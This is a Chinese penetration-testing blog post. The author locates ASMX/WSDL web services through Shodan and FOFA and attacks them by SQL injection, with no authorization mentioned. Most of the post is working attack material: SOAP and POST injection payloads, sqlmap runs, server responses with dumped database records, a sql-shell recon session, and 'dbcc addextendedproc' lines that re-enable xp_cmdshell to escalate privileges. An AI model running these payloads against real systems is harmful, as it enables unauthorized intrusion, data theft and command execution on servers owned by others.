---
title:      "「渗透」:SQL注入新姿势:)"
author:     "Bin4xin"
catalog: true

article_header:
  type: cover
tags:
    - Web
    - 渗透

---

> 由于一些机缘巧合，发现了一些SQL注入的新姿势，记录一下；

记录就是一个简单的练手记录，感觉非常有意思；
# 目标确定
在shodan、fofa上搜`asmx`，找到疑似存在wsdl注入的站，大概的是这样的：`http://vuln_ip:8081/WebService1.asmx?WSDL`，一般我们可以通过手工的方式去尝试注入，这样的站访问进去后是类似xml的文件，里面是各种与服务器交互的参数，比如登录页面的username、passwd参数，开发者们都已经配置好这些参数；
如下，这是一个参数对应的xml标签：
```javascript
<s:element name="HelloWorldResponse">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="HelloWorldResult" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

# sqlmap一把梭

## wsdl注入
我们手工的方式是构造一个SOAP对应的参数的post包发给asmx网页。post包如下：
```javascript
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="http://tempuri.org/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <urn:HelloWorldResult>
           <urn:ins>1*</urn:ins>
        </urn:HelloWorldResult>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
大致的一个构造思路就是这样的，然后观察服务器数据库的报错情况，我们可以直接把数据post包拿过来跑：
```javascript
root@#:/home/tool/sqlmap-data/wsdl-inject# sqlmap -r net-test1.txt --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end 
user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not 
responsible for any misuse or damage caused by this program

[*] starting at 11:03:20

[11:03:54] [INFO] testing Microsoft SQL Server
[11:03:54] [INFO] confirming Microsoft SQL Server
[11:04:24] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[11:04:24] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
[11:04:24] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 19 times
[11:04:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/underattack-host'

[*] shutting down at 11:04:24
```
注入payload单独发出来，如下：
```javascript
---
Parameter: SOAP #1* ((custom) POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="http://tempuri.org/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <urn:getcode>
           <urn:ins>1' AND 1597 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113))) AND 'DZUD'='DZUD</urn:ins>
        </urn:getcode>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="http://tempuri.org/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <urn:getcode>
           <urn:ins>1' UNION ALL SELECT CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(72)+CHAR(117)+CHAR(78)+CHAR(90)+CHAR(84)+CHAR(69)+CHAR(80)+CHAR(98)+CHAR(85)+CHAR(102)+CHAR(80)+CHAR(86)+CHAR(81)+CHAR(73)+CHAR(83)+CHAR(102)+CHAR(106)+CHAR(101)+CHAR(70)+CHAR(113)+CHAR(101)+CHAR(109)+CHAR(68)+CHAR(86)+CHAR(76)+CHAR(84)+CHAR(73)+CHAR(122)+CHAR(99)+CHAR(66)+CHAR(82)+CHAR(119)+CHAR(66)+CHAR(78)+CHAR(75)+CHAR(98)+CHAR(102)+CHAR(107)+CHAR(99)+CHAR(88)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- aKgd</urn:ins>
        </urn:getcode>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
---
```
我们可以偷懒一下，直接payload拿过来看看反包有什么不一样的地方~看到差别了吗。
```bash
Type: 报错注入（error-based）:
HTTP/1.1 500 Internal Server Error
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Length: 459

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request.---&gt;在将 varchar 值 'qpbzq1qzkxq' 转换成数据类型</faultstring><detail/></soap:Fault></soap:Body></soap:Envelope>
=======================================================================================
=======================================================================================
Type: 联合查询（UNION query），输出的信息比较多，限于篇幅，放上一些数据：

HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Length: 20111

<c_me_com>10005</c_me_com><c_me_no>14</c_me_no><c_me_bt>10.11.201.233</c_me_bt><c_me_command>0</c_me_command><c_me_lenght>2</c_me_lenght><c_me_start>2000</c_me_start><c_me_lastvalue>0</c_me_lastvalue><c_me_maxstep>50</c_me_maxstep><c_me_webcode>com7.db001.db001t</c_me_webcode><c_me_by19>0.00</c_me_by19><c_me_by20>1</c_me_by20><c_me_lastdate4>2018-08-08T05:00:24.677+08:00</c_me_lastdate4><c_me_lastvalue4>313</c_me_lastvalue4><c_me_lastdate3>2018-08-08T06:03:06.137+08:00</c_me_lastdate3><c_me_lastvalue3>313</c_me_lastvalue3><c_me_lastdate2>2018-08-08T07:05:47.173+08:00</c_me_lastdate2><c_me_lastvalue2>313</c_me_lastvalue2><c_me_lastdate1>2018-08-08T08:08:28.543+08:00</c_me_lastdate1><c_me_lastvalue1>313</c_me_lastvalue1><c_me_lastsuredate>2018-08-08T11:11:05.27+08:00</c_me_lastsuredate><c_me_lastsurevalue>313</c_me_lastsurevalue></d2></ds></diffgr:diffgram></getcodeResult></getcodeResponse></soap:Body></soap:Envelope>
```

## 常规查询：
当然在平常注入的过程中，不仅仅存在上述的注入，我们更多的是常见的盲注、联合查询或者是布尔盲注、时间盲注等等；我们这里举得例子同样存在，当然也是万能的awvs跑出来的：

```javascript
Discovered by Blind SQL Injection
URL encoded POST input ins was set to eizSls
查看不同输入的符号对应的true、flase值，单数的%27输入进去我们可以看到是flase，双数输入进去则为true：
462' => ERROR
462'' => OK
GwHgee''' => ERROR
7Ahb38'''' => OK
CXBMlX''''' => ERROR
xgBDwt'''''' => OK
eizSls''''''' => ERROR
```
老方法，直接SQLMAP跑~
```javascript
POST /WebService1.asmx/getcode HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://vuln_ip:8081/WebService1.asmx?WSDL
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 17
Host: vuln_ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

ins=eizSls
```
跑出来也是一样的效果，当然是一样的注入点，都是getcode这个功能接口跑的数据：
```javascript
POST parameter 'ins' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: ins (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ins=eizSls' AND 7541 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7541=7541) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113))) AND 'EJIL'='EJIL

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: ins=eizSls' UNION ALL SELECT NULL,CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(67)+CHAR(85)+CHAR(78)+CHAR(111)+CHAR(108)+CHAR(112)+CHAR(72)+CHAR(81)+CHAR(82)+CHAR(108)+CHAR(89)+CHAR(68)+CHAR(67)+CHAR(99)+CHAR(105)+CHAR(109)+CHAR(105)+CHAR(86)+CHAR(121)+CHAR(99)+CHAR(122)+CHAR(90)+CHAR(109)+CHAR(112)+CHAR(98)+CHAR(88)+CHAR(89)+CHAR(68)+CHAR(90)+CHAR(101)+CHAR(71)+CHAR(100)+CHAR(118)+CHAR(81)+CHAR(114)+CHAR(83)+CHAR(101)+CHAR(90)+CHAR(117)+CHAR(100)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- HqcH
---
```

# 信息搜集
康康user，发现是dbo。<a href="https://blog.csdn.net/u010678947/article/details/48289849">SQL SERVER中[dbo]的解释：</a>
```javascript
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
[11:16:02] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER
sql-shell> user
[11:16:13] [INFO] fetching SQL query output: 'user'
user:    'dbo'
```
看一下服务器是否站库分离：
```javascript
sql-shell> select @@servername;
[11:17:21] [INFO] fetching SQL SELECT statement query output: 'select @@servername'
select @@servername;:    'WIN-VO157IKGT24'
sql-shell> select host_name();
[11:17:25] [INFO] fetching SQL SELECT statement query output: 'select host_name()'
select host_name();:    'WIN-VO157IKGT24'
```
两个都是`WIN-VO157IKGT24`所以应该没有站库分离。看一下数据库版本号
```javascript
sql-shell> Select @@version
[11:17:34] [INFO] fetching SQL SELECT statement query output: 'Select @@version'
Select @@version:    'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \n\tApr  2 2010 15:48:46 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)\n'
```

```javascript
root@#:/home/tool/sqlmap-data/wsdl-inject# sqlmap -r net-test1.txt --batch --dbs
---
[11:04:34] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
[11:04:34] [INFO] fetching database names
available databases [7]:
[*] master
[*] model
[*] msdb
[*] ReportServer
[*] ReportServerTempDB
[*] tempdb
[*] ytems

[11:04:35] [INFO] fetched data logged to text files under '/root/.sqlmap/output/underattack-host'

[*] shutting down at 11:04:35
```

# 提权
```javascript
dbcc addextendedproc ("sp_oacreate","odsole70.dll");
dbcc addextendedproc ("xp_cmdshell","xplog70.dll");
```
to be continued；
